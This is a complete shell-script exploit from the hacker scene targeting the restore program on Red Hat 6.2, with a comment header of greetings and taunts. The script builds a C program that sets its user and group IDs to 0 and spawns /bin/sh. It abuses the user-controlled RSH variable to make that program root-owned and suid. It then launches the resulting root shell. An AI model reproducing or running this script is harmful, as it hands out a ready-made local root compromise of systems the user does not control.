#!/bin/sh
#
# Exploits a stupid bug in redhat 6.2's (others..) restore program.
# restore version 0.4b15 executes a program which is found in
# a user modifiable environment variable (RSH).
#
# Have fun!
#        - fish
#
# Shoutouts: trey, burke, dono, sinator, jadrax, minuway, lews, hubbs,
#            ralph, jen, madspin, hampton, ego, als, scorch.
#
#          Cause we da pimpz of #code! (not ef/dal.. etc)
#                     (irc > irl ? werd : lame)
#
# WERD to the async, isolated, expedience, mindsong, and analog crews
#
#
# #TelcoNinjas can eat it cause they suck hardc0re
# #TelcoNinjas == #smurfkiddies
#

echo "[spl0it]: Starting."
echo -n "[spl0it]: creating shell spawn... "

echo "#include <stdio.h>"                        > cool.c
echo "int main(void) { "                        >> cool.c
echo "    setuid(0);"                           >> cool.c
echo "    setgid(0);"                           >> cool.c
echo "    execl(\"/bin/sh\", \"-bash\", NULL);" >> cool.c
echo "    return 0;"                            >> cool.c
echo "}"                                        >> cool.c

echo -e "\t\t\tdone"

echo -n "[sploit]: Compiling shell spawn... "
gcc -o cool cool.c
echo -e "\t\t\tdone"


echo -n "[sploit]: Creating fake rsh program... "

cat > execute_me << EOF
#!/bin/sh
chown root: cool
chmod 4777 cool
EOF

chmod +x execute_me
echo -e "\t\t\tdone"


# now executing the dump command
echo "[spl0it]: Beginning exploitation: "
export TAPE=garbage:garbage
export RSH=./execute_me
/sbin/restore -i


# Exec'n the r00t sh3ll!
echo -n "[spl0it]: Waiting 4 seconds for suid shell... "
sleep 4
echo -e "\t\tdone"

if [ ! -u ./cool ]; then
  echo "[spl0it]: Hmm it didn't work.. Better luck next time eh"
  echo "[spl0it]: Check ./cool anyway =)"
  exit 0
fi

echo "[spl0it]: It Worked! suid shell is now ./cool"
echo "[spl0it]: Entering suid shell..."
./cool
exit 0

